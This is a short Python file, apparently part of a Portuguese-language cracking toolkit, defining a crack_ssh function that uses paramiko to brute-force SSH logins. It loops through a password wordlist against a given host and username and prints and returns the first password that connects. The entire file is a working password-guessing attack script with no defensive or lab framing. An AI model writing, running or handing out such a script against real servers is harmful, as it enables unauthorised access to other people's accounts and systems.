import paramiko
from tqdm import tqdm
from utils import puxar_wordlist

def crack_ssh(host, usuario, wordlist_path, port=22, timeout=5):
    wordlist = puxar_wordlist(wordlist_path)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for senha in tqdm(wordlist, desc=f"SSH {host}@{usuario}"):
        try:
            ssh.connect(host, port, usuario, senha, timeout=timeout, banner_timeout=timeout)
            print(f" SSH CONECTADO! senha: {senha}")
            ssh.close()
            return senha
        
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"[*] ERRO: {e}")   # EM PROCESSO[...]
    
    print("SSH não consegui conectar.")
    return None